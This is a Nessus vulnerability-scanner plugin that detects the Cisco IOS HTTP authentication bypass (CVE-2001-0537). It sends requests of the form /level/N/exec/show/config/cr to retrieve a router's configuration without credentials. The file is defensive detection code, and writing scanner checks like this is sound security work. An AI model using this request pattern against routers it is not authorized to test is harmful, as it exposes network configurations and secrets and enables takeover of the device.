#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10700);
 script_bugtraq_id(2936);
 script_cve_id("CVE-2001-0537");
 script_xref(name:"OSVDB", value:"578");
 script_version ("$Revision: 1.24 $");

 script_name(english:"Cisco IOS HTTP Configuration Unauthorized Administrative Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote router allows authentication to be bypassed and arbitrary 
commands to be executed." );
 script_set_attribute(attribute:"description", value:
"It is possible to execute arbitrary commands on the remote Cisco
router.  An attacker may leverage this issue to disable network access
via this device or lock legitimate users out of the router." );
 script_set_attribute(attribute:"see_also", value:"http://www.cisco.com/warp/public/707/cisco-sa-20010627-ios-http-level.shtml" );
 script_set_attribute(attribute:"solution", value:
"Disable the web configuration interface completely." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 
 summary["english"] = "Obtains the remote router configuration";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 family["english"] = "CISCO";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
kb   = get_kb_item("www/no404/" + port);

banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( "cisco-IOS" >!< banner && !egrep(pattern:"level [0-9]+ access", string:banner)) exit(0);
 

if ( ! isnull(kb) ) exit(0);

if(get_port_state(port))
{
  for(i=16;i<100;i=i+1)
  {
    url = string("/level/", i, "/exec/show/config/cr");
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res)) exit(0);

    if (
      "enable" >< res[2] &&
      "interface" >< res[2] &&
      "ip address" >< res[2]
    )
    {
      info = string(
        "\n",
        "Nessus was able to execute a command on the remote Cisco router and\n",
        "retrieve its configuration file using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "Here are its contents :\n",
        "\n",
        res[2]
      );
      security_hole(port:port, extra:info);
      exit(0);
    }
  }
}
